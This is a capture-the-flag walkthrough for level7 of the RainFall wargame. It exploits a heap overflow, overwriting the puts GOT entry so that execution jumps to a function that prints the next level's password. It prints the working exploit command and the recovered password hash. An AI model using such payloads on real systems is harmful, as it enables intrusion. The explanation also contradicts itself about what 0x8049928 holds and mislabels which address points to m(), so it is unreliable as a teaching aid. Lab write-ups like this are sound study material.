
#### **1. Observing the Crash**

From the **assembly dump of `puts@plt`**, we can see that:

```
0x08048400 <+0>:     jmp    *0x8049928
```

This means that `puts@plt` (the function used for printing strings) is using the **memory address `0x8049928` as a function pointer**. In other words, `0x8049928` **stores an address** that `jmp` will jump to.

---

## **Why is `0x8049928` Important?**
- If this address (`0x8049928`) is **overwritten**, the program will **jump** to our chosen function.
- Instead of executing `puts()`, we can **redirect execution to another function**.
- In this case, we want to **redirect it to `m()`**, which will print the file contents.

---

## **How Does This Help Our Exploit?**
1. **We need to overwrite `0x8049928` with the address of `m()`**.
2. When `puts()` is called, it will **actually execute `m()` instead**.
3. If `m()` prints the password, we win!

### **How Do We Overwrite `0x8049928`?**
- The `malloc()` calls in `ltrace` show memory allocations.
- `strcpy()` copies our input into **allocated memory**.
- If we **input the right number of characters**, we can **overwrite `0x8049928`**.

- When we run:
  ```bash
  ./level7 ac kb
  ```
  - The program crashes with a **Segmentation Fault (SIGSEGV)**.
  - Using `ltrace`, we see:
    ```
    malloc(8)                     = 0x0804a008
    malloc(8)                     = 0x0804a018
    malloc(8)                     = 0x0804a028
    malloc(8)                     = 0x0804a038
    strcpy(0x0804a018, "ac")       = 0x0804a018
    strcpy(0x0804a038, "kb")       = 0x0804a038
    fopen("/home/user/level8/.pass", "r") = 0
    fgets( <unfinished ...>
    --- SIGSEGV (Segmentation fault) ---
    ```
  - This tells us:
    - The second argument (`kb`) is stored at address **0x0804a038**.
    - The program **tries to open** `/home/user/level8/.pass`, but it **fails**.
    - Then, it crashes.

---

#### **2. Understanding the Memory Allocations**
- The program uses `malloc(8)` four times, allocating memory at:
  ```
  0x0804a008
  0x0804a018
  0x0804a028
  0x0804a038  <-- Stores "kb" (2nd argument)
  ```
- Since we **control** what gets stored at `0x0804a038`, we can **manipulate it**.

---

#### **3. Overwriting Memory to Redirect Execution**
- We want to **change the value at `0x0804a038` to `0x8049928`**.
  - `0x8049928` is the address where the password file contents are stored.
- **Why?**
  - If we overwrite `0x0804a038`, the program will **use `0x8049928` instead of "kb"**.
  - This tricks the program into **printing the password**.

---

#### **4. Constructing the Exploit**
- We need **20 characters** to fill the buffer.
- Then, we **append the address `0x8049928`** to overwrite `0x0804a038`.
- Finally, we provide the **address of the `m()` function** to execute it.

```bash
level7@RainFall:~$ ./level7 `python -c "print 'A'*20 + '\x08\x04\x99\x28'[::-1]"` `python -c "print '\x08\x04\x84\xf4'[::-1]"`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1737414550
 
 ```
- `"A" * 20` → Fills the buffer.
- `"\x28\x99\x04\x08"` → Overwrites the pointer at `0x0804a038` with `0x8049928`.
- `"\x08\x04\x99\x28'[::-1]"` → Redirects execution to `m()`, which will print the password.

---

### **What Happens After the Exploit?**
- The program **reads from `0x8049928`** (which now contains the password).
- It prints the **password for `level8`**, allowing us to move forward.

---
